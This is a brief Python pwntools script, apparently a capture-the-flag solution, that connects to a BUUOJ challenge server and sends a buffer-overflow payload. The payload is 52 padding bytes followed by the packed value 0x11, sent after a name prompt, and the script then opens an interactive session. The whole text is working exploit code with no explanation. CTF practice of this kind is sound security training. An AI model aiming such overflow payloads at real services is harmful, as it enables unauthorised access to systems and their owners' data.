from pwn import *

io = remote('node4.buuoj.cn', 29508)
payload = b'a'*13*4 + p32(0x11)
io.sendlineafter(b'What\'s your name?\n', payload)
io.interactive()